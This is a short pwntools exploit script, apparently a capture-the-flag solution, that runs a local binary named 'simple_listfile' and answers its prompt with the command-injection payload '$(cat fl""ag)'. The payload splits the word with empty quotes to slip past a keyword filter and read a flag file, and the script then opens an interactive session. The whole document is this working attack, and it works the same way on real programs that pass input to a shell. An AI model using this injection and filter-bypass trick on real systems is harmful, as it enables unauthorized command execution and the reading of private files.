from pwn import *

p = process("./simple_listfile")
p.sendlineafter(": ", "$(cat fl\"\"ag)")

p.interactive()